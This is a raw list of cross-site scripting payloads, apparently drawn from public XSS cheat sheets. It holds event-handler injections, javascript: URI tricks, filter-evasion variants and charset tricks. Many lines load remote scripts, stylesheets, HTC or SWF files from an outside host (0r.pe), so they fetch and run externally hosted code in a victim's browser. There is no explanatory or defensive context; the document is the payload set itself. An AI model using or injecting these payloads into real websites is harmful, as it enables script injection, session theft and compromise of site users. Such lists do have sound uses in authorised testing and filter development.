"/><img src=x onerror=alert('ZephrFishHackerOne')/>
...
<iframe srcdoc="<svg/onload=alert(domain)>"> #chrome 20 by @0x6D6172696F
try{*}catch(e if(alert(1))){} by @garethheyes
...
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<BODY onload!#$%&()*~+_.,:;?@[/|]^`=alert("XSS")>
<SCRIPT/SRC="http://0r.pe/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=//0r.pe/.j>
<IMG SRC="javascript:alert('XSS')"
...
<LINK REL="stylesheet" HREF="http://0r.pe/xss.css">
<STYLE>@import'http://0r.pe/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://0r.pe/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://0r.pe/xssmoz.xml#xss")}</STYLE>
<STYLE>@import'javascript:alert("XSS")';</STYLE>
...
>
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://0r.pe/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://0r.pe/xss.js?<B>
<SCRIPT SRC=//0r.pe/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://0r.pe/scriptlet.html <
<SCRIPT>a=/XSS/
...
<EMBED SRC="http://0r.pe/xss.swf" AllowScriptAccess="always"></EMBED>
<HTML xmlns:xss>
<?import namespace="xss" implementation="http://0r.pe/xss.htc">
<xss:xss>XSS</xss:xss>
</HTML>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
...
<SCRIPT SRC="http://0r.pe/xss.jpg"></SCRIPT>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD><SCRIPT>alert('XSS');</SCRIPT>
<SCRIPT a=">" SRC="http://0r.pe/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://0r.pe/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://0r.pe/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://0r.pe/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://0r.pe/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://0r.pe/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://0r.pe/xss.js"></SCRIPT>
...
<A HREF="//google">XSS</A>
<A HREF="http://0r.pe@google">XSS</A>
<A HREF="http://google:0r.pe">XSS</A>
